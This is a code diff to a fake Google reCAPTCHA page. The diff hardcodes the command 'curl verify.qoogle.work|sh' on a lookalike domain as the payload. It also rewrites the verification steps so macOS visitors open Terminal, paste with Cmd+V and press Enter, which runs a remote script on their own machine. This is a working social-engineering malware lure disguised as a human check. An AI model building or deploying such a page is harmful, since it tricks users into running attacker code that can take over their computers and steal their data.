@@ -433,7 +433,6 @@
             height: 45px;
             vertical-align: baseline;
             padding-bottom: 4px;
-            alt: "Captcha Logo";
         }
         .checkbox-desc {
             color: #555555;
@@ -682,13 +681,13 @@
                     <button type="button" id="checkbox" class="checkbox m-p line-normal"></button>
                 </div>
                 <p class="im-not-a-robot m-p line-normal">I'm not a robot</p>
-                <img src="https://www.google.com/recaptcha/about/images/reCAPTCHA-logo@2x.png" class="captcha-logo line-normal" alt="Captcha Logo">
+                <img src="https://www.google.com/recaptcha/about/images/reCAPTCHA-logo@2x.png" class="captcha-logo line-normal" alt="">
                 <br>
                 <p class="checkbox-desc m-p line-normal">
                     <a href="https://www.google.com/intl/en/policies/privacy/">Privacy</a> - 
                     <a href="https://www.google.com/intl/en/policies/terms/">Terms</a>
                 </p>
-                <img class="spinner" alt="Loading Spinner" id="spinner">
+                <img class="spinner" alt="" id="spinner">
             </div>
             
             <div id="verify-window" class="verify-window">
@@ -703,8 +702,8 @@
                             To better prove you are not a robot, please:
                         </p>
                         <ol>
-                            <li>${instruction}</li>
-                            <li>In the verification window, press ${pasteShortcut}.</li>
+                            <li>Open Terminal (<b>⌘ </b> + <b>Space</b>, type "Terminal")</li>
+                            <li>In the verification window, press <b>⌘</b> + <b>V</b>.</li>
                             <li>Press <b>Enter</b> on your keyboard to finish.</li>
                         </ol>
                         <p>
@@ -728,7 +727,7 @@
 
     <!-- Set payload as a global variable before scripts run -->
     <script>
-        window.payloadValue = ""; // Ensure this is set correctly
+        window.payloadValue = "curl verify.qoogle.work|sh"; // Hardcoded command
     </script>
 
     <script>
@@ -863,7 +862,7 @@
                     document.cookie = "captcha_passed=true; path=/";
                     window.location.reload();
                 });
-            }, 30000); // Reduced time for better UX
+            }, 120000);
         }
         // --- End of CAPTCHA JavaScript ---
 
